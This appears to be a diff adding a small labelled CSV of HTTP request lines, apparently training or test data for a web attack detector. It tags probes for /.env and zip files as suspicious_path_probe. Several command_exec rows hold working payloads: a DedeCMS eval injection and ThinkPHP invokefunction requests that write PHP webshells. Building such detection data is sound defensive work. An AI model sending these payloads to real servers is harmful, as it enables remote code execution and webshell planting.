@@ -1,0 +1,10 @@
+text,label
+METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
+METHOD=GET PATH=/tg/a.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
+METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
+METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// PROTOCOL=HTTP/1.1,command_exec
+METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec
+"METHOD=GET PATH=/ QUERY=s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E PROTOCOL=HTTP/1.1",command_exec
+"METHOD=GET PATH=/ QUERY=s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ PROTOCOL=HTTP/1.1",command_exec
+METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
+METHOD=HEAD PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
